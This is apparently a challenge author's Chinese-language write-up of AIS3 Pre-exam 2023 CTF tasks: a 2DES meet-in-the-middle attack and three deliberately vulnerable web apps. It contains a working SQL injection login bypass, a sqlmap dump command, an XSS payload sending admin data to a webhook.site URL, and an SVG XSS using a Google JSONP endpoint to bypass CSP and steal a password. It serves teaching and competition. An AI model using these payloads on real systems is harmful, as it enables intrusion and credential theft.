---
title: AIS3 Pre-exam 2023 Write-up
date: 2023-06-06 15:44:47
tags: 
  - ais3
  - ctf
categories:
  - [AIS3, Pre-exam]
typora-root-url: .
excerpt: 今年來幫 AIS3 Pre-exam 來出題，共出了 1 題 crypto（2DES），3 題 web（Login Panel, E-Portfolio, E-Portfolio baby），裡面是我的 write-up。
cover: /ais3-pre-exam-2023-write-up/myfirstctf-staff.webp
photos:
  - /ais3-pre-exam-2023-write-up/myfirstctf-staff.webp
---

## 我出的題目

### Crypto

#### 2DES

[題目連結](https://github.com/Ching367436/My-CTF-Challenges/tree/main/ais3-pre-exam/2023/crypto/2des/src)

- 解題人數
  - MyFirstCTF: 1 / 111 (score >= 100)
  - Pre-exam: 21 / 256 (score >= 100)

這題考的 Meet-in-the-Middle attack，相信直接搜尋 `2DES` 就可以知道解題方向。為了怕題目太無聊，所以還加入了需要知道 DES 的一些性質的考點（不知道這個還是解的了）。

##### 題目

首先題目會隨機生成 `key1` `key2`，其中每個 byte 的前 4 個 bits 都被固定成 `1`。

```javascript
// Generate key and IV
const key1 = crypto.randomBytes(8)
const key2 = crypto.randomBytes(8)
const iv = Buffer.concat([Buffer.from('AIS3 三')])

for (let i = 0; i < 8; i++) {
    key1[i] = key1[i] | 0b11110000
    key2[i] = key2[i] | 0b11110000
}
```

接著會把用 `key1` `key2` 加密兩層後的 `FLAG` 以及 `hint_pt` 印出來，要透過 `res` `hint_pt` `hint` `iv` 想辦法解出 `FLAG`。

```javascript
res = encrypt(encrypt(FLAG, key1, iv), key2, iv)
hint = encrypt(encrypt(hint_pt, key1, iv), key2, iv)

console.log(`let res = '${res.toString('hex')}'`)
console.log(`let hint_pt = '${hint_pt.toString('hex')}'`)
console.log(`let hint = '${hint.toString('hex')}'`)
console.log(`let iv = '${iv.toString('hex')}'`)
```

##### 題解

只要取得 `key1` `key2` 就可直接解出 `FLAG`，直接列舉 `key1` `key2` 的話會有 $2^{32}\times 2^{32}=2^{64}$ 種可能，所以是不可行的。

###### Meet-in-the-Middle

這邊可以利用 meet-in-the-middle attack 幫我們把時間複雜度開個根號，具體如下。

首先要先知道 `encrypt(hint_pt, key1, iv)` 與 `decrypt(hint, key2, iv)` 會是相等的 --（1）。

<img src="/ais3-pre-exam-2023-write-up/meet-in-the-middle.svg" style="width: 100%;" />

利用這個特性，我們先列舉出所有可能的 `middle=encrypt(hint_pt, key1, iv)`（透過列舉 `key1` 來達成），需花費 $2^{32}$ 的時間。

接著來列舉 `decrypt(hint, key2, iv)`，由於（1），所以當 `key2` 是正確的時候，一定可以在 middle 裡面找到  `decrypt(hint, key2, iv)`，所以那個 middle 所對應到的 `key1` `key2` 就很可能是正確的，這步驟最多需列舉 $2^{32}$ 個 `key2`，每次找尋 `middle` 若使用的是 Javascript 的 map 或 Python 的 dict 所花的時間在一般情況下會是 $\mathcal{O}(1)$，所以此步驟需花費 $2^{32}$ 的時間。

所以所需花的時間從原本的 $2^{32}\times 2^{32}=2^{64}$ 變成了 $2^{32}+2^{32}=2^{33}$，變的看起來可行了。

不過還有一個問題：存 $2^{32}$ 種可能的 middle 會耗掉太多空間然後噴錯（有人還把這個做成[梗圖](/ais3-pre-exam-2023-write-up/2des-meme.webp)）。

###### DES Key Transformation

DES 在拿到 64 bits 的 key 的時候，會把一些東西丟掉變成 56 bits 的 key，所以實際上需要列舉的 `key1` `key2` 其實可以更少。

DES 的 64 bits 的 key 中，第 8, 16, 24, 32, 40, 48, 56, 64 個 bit 是會被丟掉的，不會影響到加解密，所以需列舉的 `key1` `key2` 其實各只有 $2^{24}$ 種。

提供我的 Javascript 及 Python 解，都可在 200 秒內於我的電腦上跑出結果，Javascript 比較快。

[Javascript 解](https://github.com/Ching367436/My-CTF-Challenges/blob/main/ais3-pre-exam/2023/crypto/2des/exp/exp.js)

[Python 解](https://github.com/Ching367436/My-CTF-Challenges/blob/main/ais3-pre-exam/2023/crypto/2des/exp/exp.py)

這題也有人不透過 DES Key Transformation 的特性來解：既然存 $2^{32}$ 個 middle 會出錯，那就只存隨機挑的一部分就好了，存到電腦可負荷的量就好，這樣也有高機率解的出來。

### Web

#### Login Panel

[題目 source code](https://github.com/Ching367436/My-CTF-Challenges/tree/main/ais3-pre-exam/2023/web/login-panel)

- 解題人數
  - MyFirstCTF: 24 / 111 (score >= 100)
  - Pre-exam: 139 / 256 (score >= 100)

這題是 web 的 welcome 題，是來送大家分數的。進來會看到 CTF 很常出現的 login panel。

<iframe frameBorder="0" style='overflow: visible; width: 100%; height: 30rem; ' scrolling="no" srcdoc='<!DOCTYPE html> <html lang="en"> <head> <meta charset="UTF-8"> <meta http-equiv="X-UA-Compatible" content="IE=edge"> <meta name="viewport" content="width=device-width, initial-scale=1.0"><title>Login</title> <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha3/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-KK94CHFLLe+nY2dmCWGMq91rCGa5gtU4mk92HdvYe+M/SXH301p5ILy+dN9+nJOZ" crossorigin="anonymous"> <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha3/dist/js/bootstrap.bundle.min.js" integrity="sha384-ENjdO4Dr2bkBIFxQpeoTz1HIcje39Wm4jDKdf19U8gI4ddQ3GYNS7NTKfAdVQSZe" crossorigin="anonymous"></script> <script type="text/javascript"> function onSubmit(token) { login.submit(); } (function(c,l,a,r,i,t,y){ c[a]=c[a]||function(){(c[a].q=c[a].q||[]).push(arguments)}; t=l.createElement(r);t.async=1;t.src="https://www.clarity.ms/tag/"+i; y=l.getElementsByTagName(r)[0];y.parentNode.insertBefore(t,y); })(window, document, "clarity", "script", "gsfl4ftdey"); </script> </head> <body> <div class="container border rounded mt-5" style="width: 25rem; max-width: 100%;"> <form class="p-4" id="login"> <h2>Login</h2> <div class="form-text">You can login as guest/guest.</div> <div class="form-outline mt-3"> <label for="username" class="form-label">Username:</label> <input type="text" id="username" name="username" class="form-control"> </div> <div class="form-outline mt-3"> <label for="password" class="form-label">Password:</label> <input type="password" id="password" name="password" class="form-control"> </div> <input type="submit" value="Submit" class="btn btn-primary mt-3 g-recaptcha" data-sitekey="6LeIxAcTAAAAAJcZVRqyHh71UMIEGNQ_MXjiZKhI" data-callback="onSubmit"> </form> </div> </body> </html>'></iframe>

這題比賽時有提供 [source code](https://github.com/Ching367436/My-CTF-Challenges/tree/main/ais3-pre-exam/2023/web/login-panel) 所以大家可以不用通靈題目有什麼洞，直接來看看[登入部分的 code](https://github.com/Ching367436/My-CTF-Challenges/blob/main/ais3-pre-exam/2023/web/login-panel/web/app.js#L56-L72)。

看到下方的第 3 行，使用者提供的 `username` 跟 `password` 直接被放進 SQL 的語句內，所以有明顯的 SQL injection 漏洞。

需要注意的一點是第 6 行還會檢查使用者提供的 `username` 要跟 SQL query 出來的 `row.username` 相等才能成功登入。知道這些就可以來想辦法登入了。

``` javascript
app.post('/login', recaptcha.middleware.verify, (req, res) => {
    const { username, password } = req.body
    db.get(`SELECT * FROM Users WHERE username = '${username}' AND password = '${password}'`, async (err, row) => {
        if (err) return res.redirect(`https://www.youtube.com/watch?v=dQw4w9WgXcQ`)
        if (!row) return res.redirect(`/login?msg=invalid_credentials`)
        if (row.username !== username) {
            // special case
            return res.redirect(`https://www.youtube.com/watch?v=E6jbBLrxY1U`)
        }
        if (req.recaptcha.error) {
            console.log(req.recaptcha.error)
            return res.redirect(`/login?msg=invalid_captcha`)
        }
        req.session.username = username
        return res.redirect('/2fa')
    })
})
```

我們只需要將 `username` 設成 `admin`，`password` 設成 `' or ''='` SQL 語句就會變成下面這樣。所有在 `Users` 裡面的 row 都符合這個條件，加上使用的是 `db.get` 所以會回傳符合條件的第一個欄位，也就是 `admin` 的那個 row。

這個 payload 也可以通過第 6 行的檢查，所以就能成功登進去 `admin` 的帳戶了。有人一直繞不過第 6 行的檢查還被做成[梗圖](/ais3-pre-exam-2023-write-up/login-panel-meme.webp)。

```sql
SELECT * FROM Users WHERE username = 'admin' AND password = '' or ''=''
```



進去後會看到 2FA 頁面，我們先來檢查他的 2FA 功能有沒有洞，因為 source 裡面有說 flag 在 `/dashboard` 裡面，直接來看 [dashboard 的 code](https://github.com/Ching367436/My-CTF-Challenges/blob/main/ais3-pre-exam/2023/web/login-panel/web/app.js#L98-L106)。

<iframe frameBorder="0" style='overflow: visible; width: 100%; height: 37rem; ' scrolling="no" srcdoc='<!DOCTYPE html> <html lang="en">  <head>     <meta charset="UTF-8">     <meta http-equiv="X-UA-Compatible" content="IE=edge">     <meta name="viewport" content="width=device-width, initial-scale=1.0">     <meta name="robots" content="noindex,nofollow">     <title>2FA</title>     <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha3/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-KK94CHFLLe+nY2dmCWGMq91rCGa5gtU4mk92HdvYe+M/SXH301p5ILy+dN9+nJOZ" crossorigin="anonymous">     <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha3/dist/js/bootstrap.bundle.min.js" integrity="sha384-ENjdO4Dr2bkBIFxQpeoTz1HIcje39Wm4jDKdf19U8gI4ddQ3GYNS7NTKfAdVQSZe" crossorigin="anonymous"></script>     <script type="text/javascript">         (function (c, l, a, r, i, t, y) {             c[a] = c[a] || function () { (c[a].q = c[a].q || []).push(arguments) };             t = l.createElement(r); t.async = 1; t.src = "https://www.clarity.ms/tag/" + i;             y = l.getElementsByTagName(r)[0]; y.parentNode.insertBefore(t, y);         })(window, document, "clarity", "script", "gsfl4ftdey");     </script> </head>  <body>     <div class="container border rounded mt-5" style="width: 25rem; max-width: 100%">         <form class="p-4" id="login">             <h2 class="mb-3">2FA</h2>             <div class="alert alert-info" role="alert">2FA code was sent to your email. Please enter it below.</div>             <div class="alert alert-primary" role="alert">If you are a guest, your 2FA code will always be <code>99999999999999</code>.</div>              <div class="form-outline mt-3">                 <label for="code" class="form-label">2FA Code</label>                 <input type="number" id="code" name="code" class="form-control" value="99999999999999">             </div>                                       <input type="submit" value="Submit" class="btn btn-primary mt-3 g-recaptcha">         </form>     </div> </body>  </html>'></iframe>

看到下方 `/dashboard` 的部分，他根本沒去驗 2FA 認證有沒有通過，只有看 `req.session.username`，而 `req.session.username` 在成功登入的時候就已被設成 `admin` 了，所以登入到 2FA 頁面後直接訪問 `/dashboard` 就可以看到 flag 了。

```javascript
app.get('/dashboard', (req, res) => {
    if (req.session.username) {
        return res.render('dashboard', {
            username: req.session.username,
            flag: FLAG
        })
    }
    return res.redirect('/')
})
```

<iframe frameBorder="0" style='overflow: visible; width: 100%; height: 30rem; ' scrolling="no" srcdoc='<!DOCTYPE html> <html lang="en">  <head>     <meta charset="UTF-8">     <meta http-equiv="X-UA-Compatible" content="IE=edge">     <meta name="viewport" content="width=device-width, initial-scale=1.0">     <meta name="robots" content="noindex,nofollow">     <title>Dashboard</title>     <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha3/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-KK94CHFLLe+nY2dmCWGMq91rCGa5gtU4mk92HdvYe+M/SXH301p5ILy+dN9+nJOZ" crossorigin="anonymous">     <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha3/dist/js/bootstrap.bundle.min.js" integrity="sha384-ENjdO4Dr2bkBIFxQpeoTz1HIcje39Wm4jDKdf19U8gI4ddQ3GYNS7NTKfAdVQSZe" crossorigin="anonymous"></script>     <script type="text/javascript">         (function (c, l, a, r, i, t, y) {             c[a] = c[a] || function () { (c[a].q = c[a].q || []).push(arguments) };             t = l.createElement(r); t.async = 1; t.src = "https://www.clarity.ms/tag/" + i;             y = l.getElementsByTagName(r)[0]; y.parentNode.insertBefore(t, y);         })(window, document, "clarity", "script", "gsfl4ftdey");     </script> </head>  <body>     <div class="container">         <h2 class="mt-5">Dashboard</h2>         <div class="alert alert-info mt-4 alert-dismissible" role="alert">Welcome back admin!</div>                     <div class="alert alert-primary mt-4" role="alert">Here is your flag: <code>AIS3{&#39; UNION SELECT 1, 1, 1, 1 WHERE ({condition})--}</code></div>                  <a class="btn btn-primary mt-3">Logout</a>     </div>  </body>  </html>'></iframe>

然後這題雖然有裝 reCAPTCHA 但其實沒有裝好，所以可以直接用 sqlmap 把資料庫直接 dump 出來，只是有些地方要按對才挖的出來。

```sh
sqlmap http://url/login --data "username=admin*&password=p" --level 5 --risk 3 --dump
```

執行上面這個的時候，會被問到下面這類問題，這邊要按 `n`，因為有些時候會把 sqlmap 導到 Youtube 造成 sqlmap 會有錯誤的判斷。

```sh
got a 302 redirect to 'http://xxx/'. Do you want to follow? [Y/n]
```

把資料庫 dump 出來後就直接拿去正常登入就好了。

```sh
Parameter: #1* ((custom) POST)
    Type: boolean-based blind
    Title: OR boolean-based blind - WHERE or HAVING clause (NOT - comment)
    Payload: username=admin%' OR NOT 1853=1853-- aGKT&password=p

    Type: time-based blind
    Title: SQLite > 2.0 OR time-based blind (heavy query)
    Payload: username=admin%' OR 7991=LIKE(CHAR(65,66,67,68,69,70,71),UPPER(HEX(RANDOMBLOB(500000000/2)))) AND 'wNiy%'='wNiy&password=p
...
Database: <current>
Table: Users
[2 entries]
+----+----------------+---------------------------------+----------+
| id | code           | password                        | username |
+----+----------------+---------------------------------+----------+
| 1  | 47428350415632 | e1a5654762d385c8                | admin    |
| 2  | 99999999999999 | guest                           | guest    |
+----+----------------+---------------------------------+----------+
```

這題最初是想做成只能用 boolean-based blind 挖資料庫，讓大家繞 reCAPTCHA 才能解的，不過我沒去擋 `row.password` 所以可以用簡單的方法解出。

#### E-portfolio baby

[題目 source code](https://github.com/Ching367436/My-CTF-Challenges/tree/main/ais3-pre-exam/2023/web/e-portfolio-baby)

- 解題人數
  - MyFirstCTF: 0 / 111 (score >= 100)
  - Pre-exam: 35 / 256 (score >= 100)


題目 註冊 / 登入 後會來到 `Edit Portfolio` 的頁面，像下面這樣。

<iframe frameBorder="0" style='overflow: visible; width: 100%; height: 35rem; ' srcdoc='<html lang="en"><head> <title>Edit Portfolio</title> <script async="" src="https://www.clarity.ms/s/0.7.8/clarity.js"></script><script async="" src="https://www.clarity.ms/tag/gsfl4ftdey"></script> <meta charset="UTF-8"> <meta http-equiv="X-UA-Compatible" content="IE=edge"> <meta name="viewport" content="width=device-width, initial-scale=1.0"> <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha3/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-KK94CHFLLe+nY2dmCWGMq91rCGa5gtU4mk92HdvYe+M/SXH301p5ILy+dN9+nJOZ" crossorigin="anonymous"> <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha3/dist/js/bootstrap.bundle.min.js" integrity="sha384-ENjdO4Dr2bkBIFxQpeoTz1HIcje39Wm4jDKdf19U8gI4ddQ3GYNS7NTKfAdVQSZe" crossorigin="anonymous"></script> <!-- Google tag (gtag.js) --> <script async="" src="https://www.googletagmanager.com/gtag/js?id=G-2EDF3XCYWP"></script> <script nonce=""> window.dataLayer = window.dataLayer || []; function gtag() { dataLayer.push(arguments); } gtag("js", new Date()); gtag("config", "G-2EDF3XCYWP"); </script> <script type="text/javascript" nonce=""> (function (c, l, a, r, i, t, y) { c[a] = c[a] || function () { (c[a].q = c[a].q || []).push(arguments) }; t = l.createElement(r); t.async = 1; t.src = "https://www.clarity.ms/tag/" + i; y = l.getElementsByTagName(r)[0]; y.parentNode.insertBefore(t, y); })(window, document, "clarity", "script", "gsfl4ftdey"); </script> <style> body { background-color: #ffed4a; } </style></head> <body> <div class="container-sm mt-5"> <h1 class="mb-3">Edit Portfolio</h1> <div class="row mb-5"> <div class="col-sm-3"> <h3 class="mb-3 mt-3">Photo</h3> <img &#115;rc="/images/Ching367436.webp" class="img-fluid" id="avatar" style="width: 15rem;"> <div class="mt-3 mb-3"> <label class="form-label" for="avatarFile">Upload avatar</label> <input type="file" class="form-control" id="avatarFile"> </div> </div> <div class="col-sm-9"> <h3 class="mt-3">About <span id="username">Ching367436</span></h3> <textarea name="" id="about" class="form-control" rows="10"><h5>Hello!</h5>
I am a <span style="color: red;">new</span> user.</textarea> </div> </div> <div class="container"> <button type="submit" class="btn btn-primary mb-2" id="save">Save</button> <button type="submit" class="btn btn-primary mb-2" id="logout">Logout</button> <button type="submit" class="btn btn-primary mb-2" id="share">Share</button> <button type="submit" class="btn btn-primary mb-2" id="report">Share your portfolio with admin</button> <div class="g-recaptcha" data-sitekey="6LeIxAcTAAAAAJcZVRqyHh71UMIEGNQ_MXjiZKhI" data-callback="onReport" data-size="invisible"></div></div></body></html>'></iframe>

按下 Share 後可以看到輸入的 portfolio 的 HTML 被 render 出來了。而這個頁面正是按下 Share your portfolio with admin 後，admin 會拜訪的頁面，要透過這個頁面的 XSS 偷走 admin 的密碼。

<iframe frameBorder="0" style='overflow: visible; width: 100%; height: 35rem; ' srcdoc='<html lang="en"><head> <title>Share</title> <meta charset="UTF-8"> <meta http-equiv="X-UA-Compatible" content="IE=edge"> <meta name="viewport" content="width=device-width, initial-scale=1.0"> <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha3/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-KK94CHFLLe+nY2dmCWGMq91rCGa5gtU4mk92HdvYe+M/SXH301p5ILy+dN9+nJOZ" crossorigin="anonymous"> <script async="" src="https://www.clarity.ms/tag/gsfl4ftdey"></script><script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha3/dist/js/bootstrap.bundle.min.js" integrity="sha384-ENjdO4Dr2bkBIFxQpeoTz1HIcje39Wm4jDKdf19U8gI4ddQ3GYNS7NTKfAdVQSZe" crossorigin="anonymous"></script> <!-- Google tag (gtag.js) --> <script async="" src="https://www.googletagmanager.com/gtag/js?id=G-2EDF3XCYWP"></script> <script nonce=""> window.dataLayer = window.dataLayer || []; function gtag() { dataLayer.push(arguments); } gtag("js", new Date()); gtag("config", "G-2EDF3XCYWP"); </script> <script type="text/javascript" nonce=""> (function (c, l, a, r, i, t, y) { c[a] = c[a] || function () { (c[a].q = c[a].q || []).push(arguments) }; t = l.createElement(r); t.async = 1; t.src = "https://www.clarity.ms/tag/" + i; y = l.getElementsByTagName(r)[0]; y.parentNode.insertBefore(t, y); })(window, document, "clarity", "script", "gsfl4ftdey"); </script> <style> body { background-color: #ffed4a; } </style></head> <body> <div class="container mt-5"> <h1 class="mb-3">Edit Portfolio</h1> <div class="row mb-5"> <div class="col-sm-3"> <h3 class="mb-3 mt-3">Photo</h3> <img &#115;rc="/images/Ching367436.webp" class="img-fluid" id="avatar" style="width: 15rem;"> </div> <div class="col-sm-9"> <h3 class="mb-3 mt-3">About <span id="username">Ching367436</span></h3> <div id="about"><h5>Hello!</h5> I am a <span style="color: red;">new</span> user.</div> </div> </div> </div></body></html>'></iframe>

[source code](https://github.com/Ching367436/My-CTF-Challenges/blob/main/ais3-pre-exam/2023/web/e-portfolio-baby/web/src/views/share.eta#L30) 裡，也就是下面的第 7 行用了 `innerHTML`，而 `data.data.about` 也是我們可完全控制的，所以表示我們能 XSS。

```HTML
<script nonce="<%= it.nonce %>">
    fetch(`/api/share${location.search}`)
        .then(res => res.json())
        .then(data => {
            if (data.success) {
                username.innerHTML = data.data.username
                about.innerHTML = data.data.about
                avatar.src = data.data.avatar
            } else {
                alert(data.message)
            }
        })
</script>
```

有 XSS 後還需要找到能偷 密碼 的地方，剛好 [`/api/portfolio`](https://github.com/Ching367436/My-CTF-Challenges/blob/main/ais3-pre-exam/2023/web/e-portfolio-baby/web/src/app.js#L120-L130) 可以拿到使用者的密碼，因為他用了 `SELECT *`，這個送密碼到前端是 Copilot 寫的洞，如果我沒注意到這題就會變成超級水題。

```javascript
app.get("/api/portfolio", (req, res) => {
    if (!req.session.username)
        return res.status(401).json({ success: false, message: "Unauthorized" })
    db.get("SELECT * FROM Users WHERE username = ?", req.session.username, (err, row) => {
        if (err)
            return res.status(500).json({ success: false, message: "Internal server error" })
        if (!row)
            return res.status(404).json({ success: false, message: "Not found" })
        return res.json({ success: true, data: row })
    })
})
```

這裡我們使用下方的 code 設成我們的 portfolio 來觸發 XSS，注意因為這個 XSS 的點是 `innerHTML`，所以直接插入 `<script>` 是不會被執行的，這裡有說明為什麼不行 https://developer.mozilla.org/en-US/docs/Web/API/Element/innerHTML#security_considerations。

下面的 script 做的是就是把使用者的資料送到 webhook.site，儲存後按下 Share your portfolio with admin，admin 拜訪後他的資料就會被送來我們這邊，flag 就在裡面，結果在下面那張圖片裡。也有另一種送資料的方式：把資料設成自己的 portfolio。

```html
<img src=x onerror="
    fetch('/api/portfolio')
        .then(function (res) { return res.json() })
            .then(function (data) {
                location = `https://webhook.site/e4d998ee-e522-4327-a277-9fa10b77e43a?${JSON.stringify(data)}`
            });
">
```

![](/ais3-pre-exam-2023-write-up/webhook.webp)

另外看到有一些人選擇偷 cookie，但 `connect.sid` 是設成了 http only，所以 Javascript 在一般情況下是拿不到這個跟登入狀態有關的 cookie 的。

另外在 MyFirstCTF 結束後我有上台分享大家都在 portfolio 裡面放了什麼，那份簡報在[這裡](/ais3-pre-exam-2023-write-up/My%20First%20CTF%202023.pdf)。

另外這題 admin 的使用者名稱不叫作 admin，所以會看到有人會把 admin 註冊起來然後放假的 flag，很多人中計。

#### E-portfolio
[題目 source code](https://github.com/Ching367436/My-CTF-Challenges/tree/main/ais3-pre-exam/2023/web/e-portfolio)

- 解題人數
  - Pre-exam: 2 / 256 (score >= 100)

其實原本沒有 E-Portfolio baby 這題，是 MyFirstCTF 題不夠才把 E-portfolio 簡化成新的一題。

這題跟 E-Portfolio baby 的差別只有多了 [CSP](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP) 跟 [DOMPurify](https://github.com/cure53/DOMPurify) 的防護而已。

前一題的[所有 `innerHTML` 的地方](https://github.com/Ching367436/My-CTF-Challenges/blob/main/ais3-pre-exam/2023/web/e-portfolio/web/src/views/share.eta#L29-L30) 都被加上了 `DOMPurify.sanitize`，所以這些地方就很難 XSS 了，不過我們還有可以上傳圖片的地方，可以試試 SVG XSS。

```html
<script nonce="<%= it.nonce %>">
    fetch(`/api/share${location.search}`)
        .then(res => res.json())
        .then(data => {
            if (data.success) {
                username.innerHTML = DOMPurify.sanitize(data.data.username)
                about.innerHTML = DOMPurify.sanitize(data.data.about)
                avatar.src = data.data.avatar
            } else {
                alert(data.message)
            }
        })
</script>
```

使用者上傳圖片之後會被 host 到 `/avatars/<MD5 hash>.<ext>`，所以確實可以 SVG XSS。

要 XSS 之前我們還需要 bypass [CSP](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP)。把[網站設置的 CSP](https://github.com/Ching367436/My-CTF-Challenges/blob/main/ais3-pre-exam/2023/web/e-portfolio/web/src/app.js#L43-L63) 拿到 [CSP Evaluator](https://csp-evaluator.withgoogle.com/) 看看有哪些地方可以用來 XSS，發現 `'script-src'` 有 `https://*.google.com` 可以利用。

![](/ais3-pre-exam-2023-write-up/csp-evaluator.png)

可以使用下面這個 endpoint，把 XSS payload 放到 `?callback` 裡就能用了，那個網址的回應如下二所示，可看到我們的 `fetch('/api/portfolio');` 被放進回應裡，而且是個可正常執行的 Javascript。

```url
https://accounts.google.com/o/oauth2/revoke?callback=fetch(%27/api/portfolio%27);
```

```javascript
// API callback
fetch('/api/portfolio');({
  "error": {
    "code": 400,
    "message": "Invalid JSONP callback name: 'fetch('/api/portfolio');'; only alphabet, number, '_', '$', '.', '[' and ']' are allowed.",
    "status": "INVALID_ARGUMENT"
  }
}
);
```

所以解題步驟如下：

1. 把下面這個 SVG 設成自己的 avatar，他做的事情就是把使用者密碼存到自己的 portfolio 裡面。

```svg
<svg xmlns="http://www.w3.org/2000/svg">
    <script href="https://accounts.google.com/o/oauth2/revoke?callback=fetch('/api/portfolio')
                .then(function (res) { return res.json() })
                .then(function (data) {
                    if (data.success) {
                        const ADMIN_PASSWORD = data.data.password;
                        fetch('/api/login', {
                            method: 'POST',
                            headers: {
                                'Content-Type': 'application/json'
                            },
                            body: JSON.stringify({
                                username: 'c9dec36a35e1f8723cdcbbbad50123f3',
                                password: 'f7e2ca2336d33b6509656bb3581f0fa0' 
                            })
                        })
                        .then(function (res) { 
                            const formData = new FormData();
                            formData.append('about', ADMIN_PASSWORD);
                            fetch('/api/portfolio', {
                                method: 'PUT',
                                body: formData
                            })
                        })
                    } 
                });"></script>
</svg>
```

2. 把剛上傳好的 `/avatars/<MD5 hash>.svg` 網址記下來，如果直接拜訪 `/avatars/<MD5 hash>.svg` 可以確認 XSS 確實被觸發。

   所以要把 `/avatars/<MD5 hash>.svg` 送給 admin，需要蓋過[原本 Share your portfolio with admin 的網址](https://github.com/Ching367436/My-CTF-Challenges/blob/main/ais3-pre-exam/2023/web/e-portfolio/web/src/views/portfolio.eta#L86C9-L103)，其實只需把 `onReport` 蓋成送我們的 `/avatars/<MD5 hash>.svg` 的網址，像下面這樣。（之所以是蓋 `onReport` 的原因是因為 reCAPTCHA 的[配置](https://github.com/Ching367436/My-CTF-Challenges/blob/main/ais3-pre-exam/2023/web/e-portfolio/web/src/views/portfolio.eta#L35-L36)關係）。

   ```javascript
   function onReport(token) {
       const url = new URL(`/avatars/8209116d30ade81ae5c2793d3d8ed4cf.svg`, location)
       fetch('/api/report', {
           method: 'POST',
           headers: {
               'Content-Type': 'application/json'
           },
           body: JSON.stringify({ url: url.href, 'g-recaptcha-response': token }),
       })
           .then(res => res.json())
           .then(data => {
               if (data.success)
                   alert('Request sent!')
               else
                   alert(data.message)
               grecaptcha.reset();
           })
   }
   ```

   

3. 登入我們剛剛用來收資料的帳戶可以看到 portfolio 已經被設成 flag 了。

<iframe frameBorder="0" style='overflow: visible; width: 100%; height: 35rem; ' srcdoc='<html lang="en"> <head> <title>Edit Portfolio</title> <script async="" src="https://www.clarity.ms/tag/gsfl4ftdey"></script> <meta charset="UTF-8"> <meta http-equiv="X-UA-Compatible" content="IE=edge"> <meta name="viewport" content="width=device-width, initial-scale=1.0"> <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha3/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-KK94CHFLLe+nY2dmCWGMq91rCGa5gtU4mk92HdvYe+M/SXH301p5ILy+dN9+nJOZ" crossorigin="anonymous"> <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha3/dist/js/bootstrap.bundle.min.js" integrity="sha384-ENjdO4Dr2bkBIFxQpeoTz1HIcje39Wm4jDKdf19U8gI4ddQ3GYNS7NTKfAdVQSZe" crossorigin="anonymous"></script> <!-- Google tag (gtag.js) --> <script async="" src="https://www.googletagmanager.com/gtag/js?id=G-2EDF3XCYWP"></script> <script nonce=""> window.dataLayer = window.dataLayer || []; function gtag() { dataLayer.push(arguments); } gtag("js", new Date()); gtag("config", "G-2EDF3XCYWP"); </script> <script type="text/javascript" nonce=""> (function (c, l, a, r, i, t, y) { c[a] = c[a] || function () { (c[a].q = c[a].q || []).push(arguments) }; t = l.createElement(r); t.async = 1; t.src = "https://www.clarity.ms/tag/" + i; y = l.getElementsByTagName(r)[0]; y.parentNode.insertBefore(t, y); })(window, document, "clarity", "script", "gsfl4ftdey"); </script> </head> <body> <div class="container-sm mt-5"> <h1 class="mb-3">Edit Portfolio</h1> <div class="row mb-5"> <div class="col-sm-3"> <h3 class="mb-3 mt-3">Photo</h3> <img &#115;rc="/images/Ching367436.webp" class="img-fluid" id="avatar" style="width: 15rem;"> <div class="mt-3 mb-3"> <label class="form-label" for="avatarFile">Upload avatar</label> <input type="file" class="form-control" id="avatarFile"> </div> </div> <div class="col-sm-9"> <h3 class="mt-3">About <span id="username">c9dec36a35e1f8723cdcbbbad50123f3</span></h3> <textarea name="" id="about" class="form-control" rows="10">AIS3{<script href="https://accounts.google.com/o/oauth2/revoke?callback=fetch(&#39;/api/portfolio&#39;);"></script>}</textarea> </div> </div> <div class="container"> <button type="submit" class="btn btn-primary mb-2" id="save">Save</button> <button type="submit" class="btn btn-primary mb-2" id="logout">Logout</button> <button type="submit" class="btn btn-primary mb-2" id="share">Share</button> <button type="submit" class="btn btn-primary mb-2" id="report">Share your portfolio with admin</button> </div> </div> </body> </html>'></iframe>